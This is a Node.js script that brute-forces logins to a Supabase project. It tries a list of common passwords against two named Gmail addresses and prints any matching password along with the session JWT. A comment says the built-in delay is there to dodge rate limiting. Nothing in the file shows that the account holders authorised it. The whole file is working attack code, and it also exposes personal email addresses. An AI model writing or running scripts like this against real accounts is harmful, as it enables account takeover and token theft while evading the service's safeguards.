const { createClient } = require('@supabase/supabase-js');
require('dotenv').config();

const supabaseUrl = process.env.EXPO_PUBLIC_SUPABASE_URL;
const supabaseAnonKey = process.env.EXPO_PUBLIC_SUPABASE_ANON_KEY;

const supabase = createClient(supabaseUrl, supabaseAnonKey);

const emails = ['nkdasar@gmail.com', 'nkphone149@gmail.com'];
const passwords = ['password123', 'Password123!', '123456', 'password', 'test1234', '12345678', 'nkdasar'];

async function run() {
  for (const email of emails) {
    for (const password of passwords) {
      console.log(`Trying ${email} with password: ${password}...`);
      try {
        const { data, error } = await supabase.auth.signInWithPassword({
          email,
          password
        });
        if (!error && data.session) {
          console.log(`SUCCESS! Email: ${email}, Password: ${password}`);
          console.log(`JWT Token: ${data.session.access_token}`);
          return;
        }
      } catch (e) {
        // ignore
      }
      // wait a tiny bit to avoid triggering rate limit immediately
      await new Promise(resolve => setTimeout(resolve, 500));
    }
  }
  console.log("No common password worked.");
}

run();
